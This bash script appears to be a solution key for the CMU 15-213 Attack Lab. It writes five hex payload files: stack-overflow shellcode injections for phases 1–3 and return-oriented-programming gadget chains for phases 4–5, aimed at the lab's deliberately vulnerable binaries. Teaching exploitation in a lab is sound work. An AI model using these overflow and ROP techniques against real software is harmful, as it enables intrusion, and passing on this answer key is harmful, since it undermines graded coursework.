#!/bin/bash
# Solution script for CMU 15-213 Attack Lab
# This script creates the five exploit payload files (phase1.txt – phase5.txt)
# that drive ctarget / rtarget to the target touch functions.
#
# Discovered parameters (via objdump -d / gdb):
#   Cookie          : 0x59b997fa
#   Buffer size     : 40 bytes  (sub $0x28,%rsp in getbuf)
#   Buffer address  : 0x5561dc78  (rsp after alloc, ASLR off for ctarget)
#   touch1          : 0x4017c0
#   touch2          : 0x4017ec
#   touch3          : 0x4018fa
#
# ROP gadgets (from rtarget gadget farm):
#   0x4019ab : pop %rax; nop; ret              (addval_219 + 4)
#   0x4019a2 : movq %rax, %rdi; ret            (addval_273 + 2)
#   0x401a06 : movq %rsp, %rax; ret            (addval_190 + 3)
#   0x4019dd : movl %eax, %edx; nop; ret       (getval_481 + 2)
#   0x401a34 : movl %edx, %ecx; cmpb %cl,%cl; ret  (getval_159 + 1)
#   0x401a13 : movl %ecx, %esi; nop; nop; ret  (addval_436 + 2)
#   0x4019d6 : lea (%rdi,%rsi,1), %rax; ret    (add_xy)

set -euo pipefail
cd "$(dirname "$0")/starter" 2>/dev/null || cd /workspace

###############################################################################
# Phase 1 – Code-injection: call touch1
#   40 bytes padding + overwrite return address with &touch1
###############################################################################
cat > phase1.txt << 'EOF'
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
EOF

###############################################################################
# Phase 2 – Code-injection: call touch2(cookie)
#   Inject shellcode that sets %rdi = cookie, then returns to touch2.
#   Shellcode (13 bytes):
#     48 c7 c7 fa 97 b9 59   movq  $0x59b997fa, %rdi
#     68 ec 17 40 00          pushq $0x4017ec
#     c3                      ret
#   Pad to 40 bytes, then return to buffer start (0x5561dc78).
###############################################################################
cat > phase2.txt << 'EOF'
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
EOF

###############################################################################
# Phase 3 – Code-injection: call touch3(&cookie_string)
#   Inject shellcode that sets %rdi = pointer to the ASCII cookie string,
#   then returns to touch3.  The cookie string is placed on the stack
#   above the saved return address so it survives the touch3 / hexmatch
#   stack frames.
#
#     Buffer address : 0x5561dc78
#     Return address : 0x5561dca0  (buf + 0x28)
#     Cookie string  : 0x5561dca8  (ret addr + 8)
#
#   Shellcode (13 bytes):
#     48 c7 c7 a8 dc 61 55   movq  $0x5561dca8, %rdi
#     68 fa 18 40 00          pushq $0x4018fa
#     c3                      ret
###############################################################################
cat > phase3.txt << 'EOF'
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
EOF

###############################################################################
# Phase 4 – ROP: call touch2(cookie)
#   Gadget chain:
#     pop %rax          ; 0x4019ab   – load cookie into rax
#     <cookie>          ; 0x59b997fa
#     mov %rax, %rdi    ; 0x4019a2   – copy cookie to first arg
#     <touch2>          ; 0x4017ec
###############################################################################
cat > phase4.txt << 'EOF'
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
EOF

###############################################################################
# Phase 5 – ROP: call touch3(&cookie_string)
#   We need %rdi = pointer to ASCII cookie on the stack.  ASLR is on in
#   rtarget, so we compute the address at runtime using %rsp.
#
#   Gadget chain (after 40-byte padding):
#     mov %rsp, %rax    ; 0x401a06  – capture rsp (points to next slot)
#     mov %rax, %rdi    ; 0x4019a2  – rdi = captured rsp
#     pop %rax          ; 0x4019ab  – rax = offset (0x48)
#     <0x48>
#     mov %eax, %edx    ; 0x4019dd
#     mov %edx, %ecx    ; 0x401a34
#     mov %ecx, %esi    ; 0x401a13
#     lea (%rdi,%rsi),%rax ; 0x4019d6  – rax = rdi + offset
#     mov %rax, %rdi    ; 0x4019a2  – rdi = &cookie_string
#     <touch3>          ; 0x4018fa
#     "59b997fa\0"      ; ASCII cookie at offset 0x48 from captured rsp
###############################################################################
cat > phase5.txt << 'EOF'
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
EOF

echo "All phase files created."
